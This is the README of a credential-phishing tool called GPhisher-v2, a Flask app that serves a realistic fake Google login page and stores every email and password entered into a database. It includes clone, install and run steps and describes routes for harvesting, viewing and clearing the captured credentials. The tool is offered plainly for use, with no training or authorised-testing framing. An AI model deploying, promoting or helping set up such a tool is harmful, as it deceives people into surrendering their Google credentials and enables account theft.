<div align="center">

# GPhisher-v2
An Advanced Google Phishing tool powered by Flask framework.

</div>

## Features
- Easy to use
- Saves all passwords in a database
- Database can be cleared
- Login page looks Realistic (old google)


## Installation
Enter the Following commands:
```bash
git clone https://github.com/CyberTitus/GPhisher-v2.git
cd GPhisher-v2
pip3 install -r requirements.txt
python3 app.py
```
## Execution

To run the app, follow these steps:

1. In your terminal, navigate to the directory where the `GPhisher-v2` directory.
2. Run the following command to start the tool:
```python app.py```


3. Open your web browser and go to `http://localhost` or `http://127.0.0.1` to access the app.

## Usage

The tool has three routes: `/`, `/data`, and `/clear`.

### Home Page (`/`)

The home page is a form that asks the user to enter an email and password. The entered data is then stored in a database.

To access the home page, open your web browser and go to `http://localhost` or `http://127.0.0.1`.

### Data Page (`/data`)

The data page displays all the data stored in the database. This page is only accessible after the user has inputted some data in the home page.

To access the data page, open your web browser and go to `http://localhost/data` or `http://127.0.0.1/data`.

### Clear Data Page (`/clear`)

The clear data page deletes all the data stored in the database. This page is only accessible after the user has some data added.

To access the clear data page, open your web browser and go to `http://localhost/clear` or `http://127.0.0.1/clear`.

